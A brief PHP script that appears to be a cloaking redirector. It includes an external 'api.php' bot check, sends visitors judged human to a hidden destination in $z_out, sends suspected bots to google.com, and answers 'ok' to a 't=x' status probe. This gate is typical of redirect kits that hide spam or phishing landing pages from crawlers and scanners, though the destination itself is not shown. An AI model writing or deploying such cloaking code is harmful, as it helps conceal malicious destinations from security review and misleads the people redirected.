<?php
include 'api.php';
if($z_bot == $z_empty && !empty($z_out) && isset($_GET['t']) && $_GET['t'] == 'x'){
	echo 'ok';
	exit();
}
if($z_bot == $z_empty){
	if(!empty($z_out)){
		header("Location: $z_out");
	}
}
else{
	header("Location: https://google.com");
}
?>